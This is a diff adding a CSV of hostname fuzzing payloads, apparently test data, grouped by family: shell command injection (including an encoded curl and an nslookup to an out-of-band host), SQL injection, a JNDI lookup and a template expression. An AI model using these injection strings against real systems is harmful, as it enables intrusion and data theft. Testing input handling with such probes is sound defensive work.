@@ -1,0 +1,9 @@
+hostname,family
+example.com.$(id).invalid,command
+example.com.%24%28curl%20http%3A%2F%2Foast.invalid%29.invalid,command
+example.com.'||dbms_pipe.receive_message('x',5)||'.invalid,sql
+example.com.%27%20or%201%3D1--.invalid,sql
+example.com.${jndi:ldap://oast.invalid/a}.invalid,lookup
+example.com.{{7*7}}.invalid,template
+example.com.;nslookup.oast.invalid.invalid,command
+example.com.%60whoami%60.invalid,command
